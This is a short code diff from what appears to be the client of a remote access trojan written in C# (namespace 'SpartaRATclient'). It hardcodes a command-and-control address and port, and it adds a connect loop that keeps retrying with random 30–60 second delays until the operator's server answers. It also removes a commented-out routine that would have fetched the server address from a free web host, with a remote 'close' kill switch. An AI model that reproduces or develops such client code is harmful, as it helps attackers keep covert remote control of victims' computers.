@@ -15,36 +15,27 @@ namespace SpartaRATclient
 
         private static IPEndPoint SetIpAddress()
         {
-            /*
-                        String GetIpAddress()
-                        {
-                            string ipaddress;
-                            //WebClient site = new WebClient();
-                            while (true)
-                            {
-                                try
-                                {
-                                    // ipaddress = site.DownloadString("https://mysimpleweb054.000webhostapp.com/mysite/detail"); //myproject054 - username
-                                    ipaddress = "192.168.1.18"; //or change to anything else
-                                    if (ipaddress == "")
-                                        throw new Exception();
-                                    else if (ipaddress == "close")
-                                        Environment.Exit(0); //If i dont want the program to run anywhere
-                                    break;
-                                }
-                                catch { Thread.Sleep(30000); }
-                            }
-                            return ipaddress;
-                        }
-
-                        return new IPEndPoint(IPAddress.Parse(GetIpAddress()), 81);*/
-            return new IPEndPoint(IPAddress.Parse("172.0.2.131"), 81);
+            return new IPEndPoint(IPAddress.Parse("192.168.1.18"), 81);
         }
 
-        public static void Connect()
+        public static Socket Connect()
         {
             Socket ServerSocketObject = SetSocket();
             IPEndPoint IPEndpoint = SetIpAddress();
+
+            while (true)
+            {
+                try
+                {
+                    ServerSocketObject.Connect(IPEndpoint);
+                    return ServerSocketObject;
+                }
+                catch
+                {
+                    Random _ = new Random();
+                    Thread.Sleep(_.Next(30000, 60000));
+                }
+            }
 
             try
             {
